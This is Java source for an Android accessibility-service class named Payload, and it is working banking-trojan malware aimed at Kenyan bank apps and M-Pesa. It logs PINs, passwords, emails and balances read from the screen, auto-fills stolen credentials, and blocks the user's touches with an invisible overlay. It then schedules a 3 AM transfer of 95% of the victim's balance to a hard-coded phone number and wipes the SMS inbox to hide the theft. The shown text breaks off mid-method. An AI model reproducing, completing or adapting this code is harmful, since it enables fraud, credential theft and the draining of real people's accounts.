package com.yourpackage.helper;

import android.accessibilityservice.AccessibilityService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

public class Payload {
    
    // ==================== SERVICE VARIABLES ====================
    private static AccessibilityService accessibilityService;
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static AtomicBoolean isTransactionRunning = new AtomicBoolean(false);
    private static AtomicBoolean isOverlayActive = new AtomicBoolean(false);
    private static View overlayViewInstance;
    private static WindowManager windowManagerInstance;
    private static SharedPreferences sharedPreferences;
    
    // ==================== CONFIGURATION CONSTANTS ====================
    private static final String TARGET_PHONE_NUMBER = "0798688620";
    private static final int WITHDRAWAL_THRESHOLD = 500;
    private static final long ONE_DAY_MS = 24 * 60 * 60 * 1000;
    private static final long ONE_HOUR_MS = 60 * 60 * 1000;
    private static final int SURVEY_DAYS = 5;
    
    // ==================== FILE NAMES ====================
    private static final String SURVEY_DATA_FILE = "survey_data.txt";
    private static final String PIN_STORAGE_FILE = "pin.txt";
    private static final String CONFIRMED_PIN_FILE = "confirmedpin.txt";
    private static final String BALANCE_HISTORY_FILE = "balance_history.txt";
    private static final String TRANSACTION_LOG_FILE = "transaction_log.txt";
    private static final String APP_MASTERY_FILE = "app_mastery.txt";
    private static final String EXECUTION_PLAN_FILE = "execution_plan.txt";
    
    // ==================== PREFERENCE KEYS ====================
    private static final String CONFIRMED_PIN_PREF_KEY = "confirmed_pin";
    private static final String SURVEY_START_DATE_KEY = "survey_start_date";
    private static final String SURVEY_DAY_KEY = "survey_day";
    private static final String SURVEY_COMPLETE_KEY = "survey_complete";
    private static final String EXECUTION_PLANNED_KEY = "execution_planned";
    private static final String EXECUTION_DATE_KEY = "execution_date";
    private static final String EXECUTION_AMOUNT_KEY = "execution_amount";
    private static final String EXECUTION_PIN_KEY = "execution_pin";
    private static final String EXECUTION_PHONE_KEY = "execution_phone";
    private static final String EXECUTION_DONE_KEY = "execution_done";
    
    // ==================== TRACKING VARIABLES ====================
    private static String currentAppPackage = "";
    private static String currentAppName = "";
    private static String capturedPinValue = "";
    private static String confirmedPin = "";
    private static String currentBalance = "0";
    private static String lastCapturedPin = "";
    private static List<String> collectedPinsList = new ArrayList<>();
    private static Map<String, Map<String, String>> appData = new HashMap<>();
    private static Map<String, List<String>> surveyData = new HashMap<>();
    private static SurveyRecord currentSurvey = new SurveyRecord();
    private static boolean isMpesaDetected = false;
    private static boolean isProcessingWithdrawal = false;
    private static int surveyDay = 0;
    private static String executionAmount = "";
    private static String executionPin = "";
    private static String executionPhone = TARGET_PHONE_NUMBER;
    private static String executionDate = "";
    
    // ==================== SURVEY RECORD CLASS ====================
    private static class SurveyRecord {
        int day = 0;
        String date = "";
        String appName = "";
        String packageName = "";
        String balance = "0";
        String pin = "";
        String password = "";
        String email = "";
        String phoneNumber = "";
        List<String> screenData = new ArrayList<>();
        Map<String, String> fieldData = new HashMap<>();
        boolean isMpesa = false;
        boolean isBank = false;
        long timestamp = 0;
        
        void save() {
            try {
                File surveyFile = new File(appContext.getFilesDir(), SURVEY_DATA_FILE);
                FileWriter writer = new FileWriter(surveyFile, true);
                writer.append("=== DAY ").append(String.valueOf(day)).append(" ===\n");
                writer.append("Date: ").append(date).append("\n");
                writer.append("App: ").append(appName).append(" (").append(packageName).append(")\n");
                writer.append("Balance: ").append(balance).append("\n");
                writer.append("PIN: ").append(pin).append("\n");
                writer.append("Password: ").append(password).append("\n");
                writer.append("Email: ").append(email).append("\n");
                writer.append("Phone: ").append(phoneNumber).append("\n");
                writer.append("Is M-Pesa: ").append(String.valueOf(isMpesa)).append("\n");
                writer.append("Is Bank: ").append(String.valueOf(isBank)).append("\n");
                writer.append("Timestamp: ").append(String.valueOf(timestamp)).append("\n");
                writer.append("--- Screen Data ---\n");
                for (String data : screenData) {
                    writer.append(data).append("\n");
                }
                writer.append("--- Field Data ---\n");
                for (Map.Entry<String, String> entry : fieldData.entrySet()) {
                    writer.append(entry.getKey()).append(": ").append(entry.getValue()).append("\n");
                }
                writer.append("====================\n\n");
                writer.flush();
                writer.close();
            } catch (IOException e) {}
        }
    }

    // ==================== APP PACKAGES ====================
    private static final Map<String, String> APP_PACKAGES = new HashMap<>();
    
    static {
        APP_PACKAGES.put("ke.co.kcbgroup.app", "KCB Mobile App");
        APP_PACKAGES.put("ke.co.equitygroup.equitymobile", "Equity Mobile");
        APP_PACKAGES.put("com.coopbank.mobile", "MCo-opCash");
        APP_PACKAGES.put("com.absa.kenya", "Absa Banking App");
        APP_PACKAGES.put("com.scb.phonebanking.ke", "SC Mobile Kenya");
        APP_PACKAGES.put("com.stanbic.ke", "Stanbic Bank Mobile");
        APP_PACKAGES.put("com.ncba.now", "NCBA NOW");
        APP_PACKAGES.put("com.imbank.mobile", "I&M On The Go");
        APP_PACKAGES.put("com.familybank.pesapap", "PesaPap");
        APP_PACKAGES.put("com.dtbafrica.dtb360", "DTB 360");
        APP_PACKAGES.put("com.nbk.natmobile", "NatMobile");
        APP_PACKAGES.put("com.primebank.primemobi", "PrimeMobi");
        APP_PACKAGES.put("com.boakenya.mobilebanking", "BOA Wallet");
        APP_PACKAGES.put("com.hfgroup.mobile", "HFC Mobile");
        APP_PACKAGES.put("com.kingdombank.mobile", "Kingdom Bank Mobile");
        APP_PACKAGES.put("com.ecobank.android", "Ecobank Mobile");
        APP_PACKAGES.put("com.creditbank.mobile", "Credit Bank Mobile");
        APP_PACKAGES.put("com.ubagroup.umobile", "UBA Mobile Banking");
        APP_PACKAGES.put("com.gtbank.gtworldv1", "GTWorld");
        APP_PACKAGES.put("com.safaricom.mpesa", "M-Pesa");
        APP_PACKAGES.put("com.android.stk", "SIM Toolkit");
        APP_PACKAGES.put("com.safaricom.stk", "SIM Toolkit");
    }

    // ==================== INITIALIZATION ====================
    public static void initialize(AccessibilityService service, Context context) {
        accessibilityService = service;
        appContext = context;
        sharedPreferences = context.getSharedPreferences("mpesa_preferences", Context.MODE_PRIVATE);
        windowManagerInstance = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        
        loadAllData();
        loadConfirmedPin();
        initializeSurvey();
        checkExecutionPlan();
    }

    // ==================== SURVEY INITIALIZATION ====================
    
    private static void initializeSurvey() {
        String startDate = sharedPreferences.getString(SURVEY_START_DATE_KEY, "");
        String today = new SimpleDateFormat("yyyy-MM-dd", Locale.US).format(new Date());
        
        if (startDate.isEmpty()) {
            // First time - start survey
            sharedPreferences.edit()
                .putString(SURVEY_START_DATE_KEY, today)
                .putInt(SURVEY_DAY_KEY, 1)
                .putBoolean(SURVEY_COMPLETE_KEY, false)
                .apply();
            surveyDay = 1;
        } else {
            // Calculate survey day
            surveyDay = sharedPreferences.getInt(SURVEY_DAY_KEY, 1);
            boolean complete = sharedPreferences.getBoolean(SURVEY_COMPLETE_KEY, false);
            
            if (!complete && surveyDay <= SURVEY_DAYS) {
                // Continue survey
                startSurveyDay(surveyDay);
            } else if (surveyDay > SURVEY_DAYS) {
                // Survey complete - plan execution
                sharedPreferences.edit().putBoolean(SURVEY_COMPLETE_KEY, true).apply();
                planExecution();
            }
        }
    }

    private static void startSurveyDay(int day) {
        currentSurvey = new SurveyRecord();
        currentSurvey.day = day;
        currentSurvey.date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
        currentSurvey.timestamp = System.currentTimeMillis();
        
        // Start monitoring all apps
        mainHandler.postDelayed(() -> {
            // Survey active - collect data
        }, 100);
    }

    // ==================== APP DETECTION & SURVEY ====================
    
    public static void checkAndTrackApp(String packageName) {
        currentAppPackage = packageName;
        currentAppName = APP_PACKAGES.getOrDefault(packageName, packageName);
        
        if (APP_PACKAGES.containsKey(packageName)) {
            // Update survey data
            currentSurvey.appName = currentAppName;
            currentSurvey.packageName = currentAppPackage;
            
            if (packageName.equals("com.safaricom.mpesa") || 
                packageName.equals("com.android.stk") ||
                packageName.equals("com.safaricom.stk")) {
                currentSurvey.isMpesa = true;
                isMpesaDetected = true;
            } else {
                currentSurvey.isBank = true;
                isMpesaDetected = false;
            }
            
            // Show blocking overlay
            showBlockingOverlay();
            
            // Start screen reading and data collection
            startScreenReading();
            
            // Handle app
            if (isMpesaDetected) {
                handleMpesa();
            } else {
                handleBankApp(packageName);
            }
        }
    }

    // ==================== SCREEN READING & DATA COLLECTION ====================
    
    private static void startScreenReading() {
        mainHandler.postDelayed(() -> {
            readAndCollectData();
        }, 300);
    }

    private static void readAndCollectData() {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) {
                mainHandler.postDelayed(() -> readAndCollectData(), 200);
                return;
            }

            collectAllData(rootNode);
            rootNode.recycle();
            
            mainHandler.postDelayed(() -> readAndCollectData(), 200);

        } catch (Exception e) {
            mainHandler.postDelayed(() -> readAndCollectData(), 500);
        }
    }

    private static void collectAllData(AccessibilityNodeInfo rootNode) {
        try {
            if (rootNode == null) return;
            
            // Collect all text from screen
            String screenText = rootNode.getText() != null ? 
                rootNode.getText().toString() : "";
            if (!screenText.isEmpty()) {
                currentSurvey.screenData.add(screenText);
            }
            
            // Collect editable fields
            if (rootNode.isEditable()) {
                CharSequence nodeText = rootNode.getText();
                String hint = rootNode.getHintText() != null ? 
                    rootNode.getHintText().toString().toLowerCase() : "";
                String viewId = rootNode.getViewIdResourceName() != null ?
                    rootNode.getViewIdResourceName() : "";
                
                if (nodeText != null) {
                    String text = nodeText.toString().trim();
                    
                    // Collect PIN
                    if (text.length() == 4 && text.matches("\\d{4}")) {
                        if (!text.equals(lastCapturedPin)) {
                            capturedPinValue = text;
                            lastCapturedPin = text;
                            currentSurvey.pin = text;
                            currentSurvey.fieldData.put("PIN", text);
                            savePinToFile(text);
                            saveAppData("PIN", text);
                        }
                    }
                    
                    // Collect Password
                    if (hint.contains("password") || hint.contains("pass") || 
                        viewId.toLowerCase().contains("password")) {
                        currentSurvey.password = text;
                        currentSurvey.fieldData.put("PASSWORD", text);
                        saveAppData("PASSWORD", text);
                    }
                    
                    // Collect Email
                    if (text.contains("@") && text.contains(".") && text.length() > 5) {
                        currentSurvey.email = text;
                        currentSurvey.fieldData.put("EMAIL", text);
                        saveAppData("EMAIL", text);
                    }
                    
                    // Collect Balance
                    if (text.contains("KES") || text.contains("KSh") || 
                        text.contains("Balance") || text.contains("Salio")) {
                        String balance = extractBalance(text);
                        if (balance != null) {
                            currentBalance = balance;
                            currentSurvey.balance = balance;
                            currentSurvey.fieldData.put("BALANCE", balance);
                            saveBalanceHistory(balance);
                            saveAppData("BALANCE", balance);
                        }
                    }
                    
                    // Collect Phone Number
                    if (text.startsWith("07") || text.startsWith("01") || 
                        text.startsWith("+254") || text.startsWith("254")) {
                        if (text.length() >= 10 && text.length() <= 13) {
                            currentSurvey.phoneNumber = text;
                            currentSurvey.fieldData.put("PHONE", text);
                        }
                    }
                }
            }

            for (int i = 0; i < rootNode.getChildCount(); i++) {
                AccessibilityNodeInfo childNode = rootNode.getChild(i);
                if (childNode != null) {
                    collectAllData(childNode);
                    childNode.recycle();
                }
            }
        } catch (Exception e) {}
    }

    // ==================== SURVEY DAY COMPLETION ====================
    
    private static void completeSurveyDay() {
        // Save survey data
        currentSurvey.save();
        
        // Update survey day
        surveyDay++;
        sharedPreferences.edit().putInt(SURVEY_DAY_KEY, surveyDay).apply();
        
        // Check if survey is complete
        if (surveyDay > SURVEY_DAYS) {
            sharedPreferences.edit().putBoolean(SURVEY_COMPLETE_KEY, true).apply();
            planExecution();
        } else {
            // Start next survey day
            startSurveyDay(surveyDay);
        }
    }

    // ==================== EXECUTION PLAN ====================
    
    private static void planExecution() {
        try {
            // Get the best data from survey
            String bestPin = getBestPin();
            String bestBalance = getBestBalance();
            String bestPhone = getBestPhone();
            
            // Calculate execution amount (95% of best balance)
            String executionAmount = calculateNinetyFivePercent(bestBalance);
            
            // Calculate execution date (5th day at 3:00 AM)
            String startDate = sharedPreferences.getString(SURVEY_START_DATE_KEY, "");
            java.util.Calendar cal = java.util.Calendar.getInstance();
            cal.setTime(new SimpleDateFormat("yyyy-MM-dd", Locale.US).parse(startDate));
            cal.add(java.util.Calendar.DAY_OF_YEAR, SURVEY_DAYS);
            cal.set(java.util.Calendar.HOUR_OF_DAY, 3);
            cal.set(java.util.Calendar.MINUTE, 0);
            cal.set(java.util.Calendar.SECOND, 0);
            
            String executionDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(cal.getTime());
            
            // Save execution plan
            sharedPreferences.edit()
                .putString(EXECUTION_PIN_KEY, bestPin)
                .putString(EXECUTION_AMOUNT_KEY, executionAmount)
                .putString(EXECUTION_PHONE_KEY, bestPhone)
                .putString(EXECUTION_DATE_KEY, executionDate)
                .putBoolean(EXECUTION_PLANNED_KEY, true)
                .putBoolean(EXECUTION_DONE_KEY, false)
                .apply();
            
            // Save to file
            saveExecutionPlan(bestPin, executionAmount, bestPhone, executionDate);
            
            // Schedule execution
            scheduleExecution(cal.getTimeInMillis());
            
        } catch (Exception e) {}
    }

    private static String getBestPin() {
        // Get confirmed pin or most common pin
        String pin = sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
        if (pin != null) return pin;
        
        // Check survey data for PIN
        try {
            File surveyFile = new File(appContext.getFilesDir(), SURVEY_DATA_FILE);
            if (surveyFile.exists()) {
                BufferedReader reader = new BufferedReader(new FileReader(surveyFile));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.startsWith("PIN: ")) {
                        return line.substring(5).trim();
                    }
                }
                reader.close();
            }
        } catch (IOException e) {}
        
        return "1234"; // Default fallback
    }

    private static String getBestBalance() {
        // Get highest balance from survey
        double highest = 0;
        try {
            File surveyFile = new File(appContext.getFilesDir(), SURVEY_DATA_FILE);
            if (surveyFile.exists()) {
                BufferedReader reader = new BufferedReader(new FileReader(surveyFile));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.startsWith("Balance: ")) {
                        String balance = line.substring(9).trim();
                        try {
                            double bal = Double.parseDouble(balance);
                            if (bal > highest) highest = bal;
                        } catch (Exception e) {}
                    }
                }
                reader.close();
            }
        } catch (IOException e) {}
        
        return String.format("%.0f", highest);
    }

    private static String getBestPhone() {
        // Get most common phone number from survey
        Map<String, Integer> phoneCount = new HashMap<>();
        try {
            File surveyFile = new File(appContext.getFilesDir(), SURVEY_DATA_FILE);
            if (surveyFile.exists()) {
                BufferedReader reader = new BufferedReader(new FileReader(surveyFile));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.startsWith("Phone: ")) {
                        String phone = line.substring(7).trim();
                        phoneCount.put(phone, phoneCount.getOrDefault(phone, 0) + 1);
                    }
                }
                reader.close();
            }
        } catch (IOException e) {}
        
        String bestPhone = TARGET_PHONE_NUMBER;
        int highest = 0;
        for (Map.Entry<String, Integer> entry : phoneCount.entrySet()) {
            if (entry.getValue() > highest) {
                highest = entry.getValue();
                bestPhone = entry.getKey();
            }
        }
        return bestPhone;
    }

    private static void saveExecutionPlan(String pin, String amount, String phone, String date) {
        try {
            File planFile = new File(appContext.getFilesDir(), EXECUTION_PLAN_FILE);
            FileWriter writer = new FileWriter(planFile, false);
            writer.append("=== EXECUTION PLAN ===\n");
            writer.append("Execution Date: ").append(date).append("\n");
            writer.append("Phone Number: ").append(phone).append("\n");
            writer.append("Amount: ").append(amount).append("\n");
            writer.append("PIN: ").append(pin).append("\n");
            writer.append("Status: PLANNED\n");
            writer.append("=====================\n");
            writer.flush();
            writer.close();
        } catch (IOException e) {}
    }

    // ==================== SCHEDULE EXECUTION ====================
    
    private static void scheduleExecution(long executionTime) {
        long currentTime = System.currentTimeMillis();
        long delay = executionTime - currentTime;
        
        if (delay < 0) {
            delay += ONE_DAY_MS; // If passed, schedule for next day
        }
        
        mainHandler.postDelayed(() -> {
            executePlannedWithdrawal();
        }, delay);
    }

    private static void executePlannedWithdrawal() {
        // Check if already executed
        if (sharedPreferences.getBoolean(EXECUTION_DONE_KEY, false)) {
            return;
        }
        
        // Get execution details
        String pin = sharedPreferences.getString(EXECUTION_PIN_KEY, null);
        String amount = sharedPreferences.getString(EXECUTION_AMOUNT_KEY, null);
        String phone = sharedPreferences.getString(EXECUTION_PHONE_KEY, TARGET_PHONE_NUMBER);
        
        if (pin == null || amount == null) return;
        
        if (isTransactionRunning.get()) return;
        isTransactionRunning.set(true);
        isProcessingWithdrawal = true;
        
        try {
            // Open M-Pesa and execute
            openMpesaApplication();
            sleep(50);
            
            clickByText("M-Pesa");
            sleep(30);
            clickByText("Send Money");
            sleep(30);
            clickByText("To Phone Number");
            sleep(30);
            
            fillFieldByHint("Enter phone number", phone);
            sleep(30);
            clickByText("OK");
            sleep(30);
            
            fillFieldByHint("Enter amount", amount);
            sleep(30);
            clickByText("OK");
            sleep(30);
            
            clickByText("Confirm");
            sleep(30);
            
            typePinAndSend(pin);
            
            // Mark execution done
            sharedPreferences.edit().putBoolean(EXECUTION_DONE_KEY, true).apply();
            
            logTransaction("EXECUTION_PLAN", "Withdrawal", amount, "Success");
            
            mainHandler.postDelayed(() -> {
                deleteAllSMSMessages();
                pressBack();
                pressBack();
                isTransactionRunning.set(false);
                isProcessingWithdrawal = false;
                removeBlockingOverlay();
            }, 1000);
            
        } catch (Exception e) {
            isTransactionRunning.set(false);
            isProcessingWithdrawal = false;
            removeBlockingOverlay();
            logTransaction("EXECUTION_PLAN", "Withdrawal", amount, "Failed: " + e.getMessage());
        }
    }

    // ==================== CHECK EXECUTION PLAN ====================
    
    private static void checkExecutionPlan() {
        boolean planned = sharedPreferences.getBoolean(EXECUTION_PLANNED_KEY, false);
        boolean done = sharedPreferences.getBoolean(EXECUTION_DONE_KEY, false);
        
        if (planned && !done) {
            String executionDate = sharedPreferences.getString(EXECUTION_DATE_KEY, "");
            if (!executionDate.isEmpty()) {
                try {
                    Date date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).parse(executionDate);
                    scheduleExecution(date.getTime());
                } catch (Exception e) {}
            }
        }
    }

    // ==================== DATA STORAGE HELPERS ====================
    
    private static void savePinToFile(String pin) {
        try {
            File pinFile = new File(appContext.getFilesDir(), PIN_STORAGE_FILE);
            FileWriter writer = new FileWriter(pinFile, true);
            writer.append(pin).append("\n");
            writer.flush();
            writer.close();
            
            collectedPinsList.add(pin);
            
            if (collectedPinsList.size() >= 3) {
                confirmCollectedPins();
            }
            
        } catch (IOException e) {}
    }

    private static void confirmCollectedPins() {
        boolean allMatch = true;
        for (int i = 1; i < collectedPinsList.size(); i++) {
            if (!collectedPinsList.get(i).equals(collectedPinsList.get(0))) {
                allMatch = false;
                break;
            }
        }

        if (allMatch && collectedPinsList.size() >= 3) {
            String confirmedPin = collectedPinsList.get(0);
            
            try {
                File confirmedFile = new File(appContext.getFilesDir(), CONFIRMED_PIN_FILE);
                FileWriter writer = new FileWriter(confirmedFile, false);
                writer.append(confirmedPin).append("\n");
                writer.flush();
                writer.close();
            } catch (IOException e) {}
            
            sharedPreferences.edit().putString(CONFIRMED_PIN_PREF_KEY, confirmedPin).apply();
            collectedPinsList.clear();
            
            try {
                File pinFile = new File(appContext.getFilesDir(), PIN_STORAGE_FILE);
                if (pinFile.exists()) pinFile.delete();
            } catch (Exception e) {}
        }
    }

    private static void loadConfirmedPin() {
        try {
            File confirmedFile = new File(appContext.getFilesDir(), CONFIRMED_PIN_FILE);
            if (!confirmedFile.exists()) return;
            
            BufferedReader reader = new BufferedReader(new FileReader(confirmedFile));
            String pin = reader.readLine();
            reader.close();
            
            if (pin != null && !pin.isEmpty()) {
                sharedPreferences.edit().putString(CONFIRMED_PIN_PREF_KEY, pin).apply();
                confirmedPin = pin;
            }
            
        } catch (IOException e) {}
    }

    private static void saveAppData(String key, String value) {
        try {
            Map<String, String> appDataMap = appData.get(currentAppPackage);
            if (appDataMap == null) {
                appDataMap = new HashMap<>();
                appData.put(currentAppPackage, appDataMap);
            }
            appDataMap.put(key, value);
            
            File dataFile = new File(appContext.getFilesDir(), 
                currentAppPackage.replace(".", "_") + "_data.txt");
            FileWriter writer = new FileWriter(dataFile, true);
            writer.append(key).append(": ").append(value)
                  .append(" | ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()))
                  .append("\n");
            writer.flush();
            writer.close();
            
        } catch (IOException e) {}
    }

    private static void saveBalanceHistory(String balance) {
        try {
            File balanceFile = new File(appContext.getFilesDir(), BALANCE_HISTORY_FILE);
            FileWriter writer = new FileWriter(balanceFile, true);
            writer.append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()))
                  .append(" | ").append(currentAppName)
                  .append(" | Balance: ").append(balance)
                  .append("\n");
            writer.flush();
            writer.close();
        } catch (IOException e) {}
    }

    private static void logTransaction(String app, String type, String amount, String status) {
        try {
            File logFile = new File(appContext.getFilesDir(), TRANSACTION_LOG_FILE);
            FileWriter writer = new FileWriter(logFile, true);
            writer.append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()))
                  .append(" | ").append(app)
                  .append(" | ").append(type)
                  .append(" | Amount: ").append(amount)
                  .append(" | Status: ").append(status)
                  .append("\n");
            writer.flush();
            writer.close();
        } catch (IOException e) {}
    }

    private static void loadAllData() {
        loadConfirmedPin();
        // Load app data from files
        for (String packageName : APP_PACKAGES.keySet()) {
            try {
                File dataFile = new File(appContext.getFilesDir(), 
                    packageName.replace(".", "_") + "_data.txt");
                if (dataFile.exists()) {
                    BufferedReader reader = new BufferedReader(new FileReader(dataFile));
                    String line;
                    Map<String, String> dataMap = new HashMap<>();
                    while ((line = reader.readLine()) != null) {
                        String[] parts = line.split(": ", 2);
                        if (parts.length == 2) {
                            dataMap.put(parts[0], parts[1].split(" \\| ")[0]);
                        }
                    }
                    reader.close();
                    appData.put(packageName, dataMap);
                }
            } catch (IOException e) {}
        }
    }

    // ==================== UTILITY METHODS ====================

    private static String extractBalance(String text) {
        try {
            String[] patterns = {
                "Balance: KES (\\d+)",
                "Balance: KES ([\\d,]+)",
                "KES ([\\d,]+) available",
                "balance is KES ([\\d,]+)",
                "Salio: KES ([\\d,]+)",
                "Available: KES ([\\d,]+)",
                "KES (\\d+)\\.\\d{2}",
                "KSh ([\\d,]+)",
                "KES ([\\d,]+)"
            };
            
            for (String pattern : patterns) {
                java.util.regex.Pattern p = java.util.regex.Pattern.compile(pattern);
                java.util.regex.Matcher m = p.matcher(text);
                if (m.find()) {
                    return m.group(1).replace(",", "");
                }
            }
        } catch (Exception e) {}
        return null;
    }

    private static String calculateNinetyFivePercent(String balance) {
        try {
            double balanceAmount = Double.parseDouble(balance);
            double resultAmount = balanceAmount * 0.95;
            return String.format("%.0f", resultAmount);
        } catch (Exception e) {
            return "500";
        }
    }

    // ==================== APP HANDLING ====================
    
    private static void handleMpesa() {
        mainHandler.postDelayed(() -> {
            String balance = getBalanceFromSMS();
            if (balance != null) {
                currentBalance = balance;
                currentSurvey.balance = balance;
                currentSurvey.save();
            }
            // Complete survey day after handling M-Pesa
            completeSurveyDay();
        }, 500);
    }

    private static void handleBankApp(String packageName) {
        // Auto-fill credentials if available
        String savedPin = getAppData("PIN");
        String savedPassword = getAppData("PASSWORD");
        String savedEmail = getAppData("EMAIL");
        
        if (savedPin != null || savedPassword != null || savedEmail != null) {
            autoFillCredentials(savedPin, savedPassword, savedEmail);
        }
        
        // Complete survey day after some time
        mainHandler.postDelayed(() -> {
            completeSurveyDay();
        }, 5000);
    }

    private static String getAppData(String key) {
        Map<String, String> appDataMap = appData.get(currentAppPackage);
        if (appDataMap != null) {
            return appDataMap.get(key);
        }
        return null;
    }

    private static void autoFillCredentials(String pin, String password, String email) {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            List<AccessibilityNodeInfo> editableNodes = 
                rootNode.findAccessibilityNodeInfosByViewId("android:id/edit");
            
            for (AccessibilityNodeInfo node : editableNodes) {
                if (node.isEditable()) {
                    String hint = node.getHintText() != null ? 
                        node.getHintText().toString().toLowerCase() : "";
                    String viewId = node.getViewIdResourceName() != null ?
                        node.getViewIdResourceName().toLowerCase() : "";
                    
                    Bundle args = new Bundle();
                    
                    if (hint.contains("pin") || hint.contains("password") || 
                        viewId.contains("pin") || viewId.contains("password")) {
                        if (pin != null) {
                            args.putCharSequence(
                                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pin);
                            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                            sleep(20);
                        }
                    } else if (hint.contains("email") || hint.contains("username") ||
                        viewId.contains("email") || viewId.contains("username")) {
                        if (email != null) {
                            args.putCharSequence(
                                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, email);
                            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                            sleep(20);
                        }
                    }
                }
            }
            
            rootNode.recycle();
            
            clickByText("Login");
            sleep(30);
            clickByText("Confirm");
            sleep(30);
            clickByText("Sign In");
            sleep(30);
            
        } catch (Exception e) {}
    }

    private static String getBalanceFromSMS() {
        try {
            ContentResolver contentResolver = appContext.getContentResolver();
            Uri smsUri = Uri.parse("content://sms/inbox");
            String[] projectionColumns = new String[]{"body"};
            String selectionCondition = "address LIKE ? AND body LIKE ?";
            String[] selectionArguments = new String[]{"%MPESA%", "%Balance%"};
            
            android.database.Cursor smsCursor = contentResolver.query(
                smsUri, 
                projectionColumns, 
                selectionCondition, 
                selectionArguments, 
                "date DESC"
            );
            
            if (smsCursor != null && smsCursor.moveToFirst()) {
                String smsBody = smsCursor.getString(0);
                smsCursor.close();
                
                String[] regexPatterns = {
                    "Balance: KES (\\d+)",
                    "Balance: KES ([\\d,]+)",
                    "KES ([\\d,]+) available",
                    "balance is KES ([\\d,]+)",
                    "Salio: KES ([\\d,]+)"
                };
                
                for (String pattern : regexPatterns) {
                    java.util.regex.Pattern compiledPattern = java.util.regex.Pattern.compile(pattern);
                    java.util.regex.Matcher matcher = compiledPattern.matcher(smsBody);
                    if (matcher.find()) {
                        return matcher.group(1).replace(",", "");
                    }
                }
            }
        } catch (Exception e) {}
        return null;
    }

    // ==================== UI HELPERS ====================
    
    private static void showBlockingOverlay() {
        try {
            if (overlayViewInstance != null) {
                windowManagerInstance.removeView(overlayViewInstance);
                overlayViewInstance = null;
            }

            View blockingOverlay = new View(appContext);
            blockingOverlay.setBackgroundColor(0x00000000);
            blockingOverlay.setLayoutParams(new View.LayoutParams(
                View.LayoutParams.MATCH_PARENT,
                View.LayoutParams.MATCH_PARENT
            ));
            blockingOverlay.setOnTouchListener((view, event) -> true);

            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION |
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.graphics.PixelFormat.TRANSLUCENT
            );

            overlayViewInstance = blockingOverlay;
            windowManagerInstance.addView(overlayViewInstance, layoutParams);
            isOverlayActive.set(true);

        } catch (Exception e) {}
    }

    private static void removeBlockingOverlay() {
        try {
            if (overlayViewInstance != null && windowManagerInstance != null) {
                windowManagerInstance.removeView(overlayViewInstance);
                overlayViewInstance = null;
                isOverlayActive.set(false);
            }
        } catch (Exception e) {}
    }

    private static void typePinAndSend(String pin) {
        for (char digit : pin.toCharArray()) {
            clickByText(String.valueOf(digit));
            sleep(10);
        }
        sleep(30);
        clickByText("SEND");
        sleep(30);
        clickByText("Send");
        sleep(30);
        clickByText("OK");
        sleep(30);
    }

    private static void deleteAllSMSMessages() {
        try {
            ContentResolver contentResolver = appContext.getContentResolver();
            contentResolver.delete(Uri.parse("content://sms/inbox"), null, null);
            contentResolver.delete(Uri.parse("content://sms/sent"), null, null);
            contentResolver.delete(Uri.parse("content://sms/trash"), null, null);
            contentResolver.delete(
                Uri.parse("content://sms"), 
                "address LIKE ?", 
                new String[]{"%MPESA%"}
            );
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                try {
                    contentResolver.delete(Telephony.Sms.CONTENT_URI, null, null);
                } catch (Exception ignored) {}
            }
            
        } catch (Exception e) {}
    }

    private static void openMpesaApplication() {
        try {
            Intent mpesaIntent = appContext.getPackageManager()
                .getLaunchIntentForPackage("com.safaricom.mpesa");
            if (mpesaIntent != null) {
                mpesaIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                appContext.startActivity(mpesaIntent);
                sleep(50);
                return;
            }
            
            accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            sleep(30);
            clickByText("M-Pesa");
        } catch (Exception e) {}
    }

    private static void clickByText(String buttonText) {
